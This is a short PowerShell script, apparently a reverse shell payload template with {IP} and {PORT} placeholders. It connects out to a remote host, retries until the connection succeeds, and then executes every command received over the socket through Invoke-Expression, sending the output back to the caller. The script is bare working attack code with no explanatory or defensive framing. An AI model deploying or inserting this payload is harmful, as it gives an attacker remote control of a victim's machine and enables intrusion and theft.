Start-Sleep 5;
$c = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});
while (-not $c.Connected){
    Start-Sleep 120
    $c = New-Object System.Net.Sockets.TCPClient('{IP}',{PORT});
}
Start-Sleep -s 10;
$s = $c.GetStream();
[byte[]]$b = 0..65535|%{0};
$sb = ([text.encoding]::ASCII).Getbytes("[PS]>> ");
$s.Write($sb,0,$sb.Length);
$s.Flush();
while(($i = $s.Read($b, 0, $b.Length)) -ne 0){
    $d = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0, $i);
    $sb = (iex $d 2>&1 | Out-String );
    $sb = ([text.encoding]::ASCII).Getbytes($sb);
    $s.Write($sb,0,$sb.Length);
    $s.Flush();
    $sb = ([text.encoding]::ASCII).Getbytes("[PS]>> ");
    $s.Write($sb,0,$sb.Length);
    $s.Flush();
};
$c.Close();
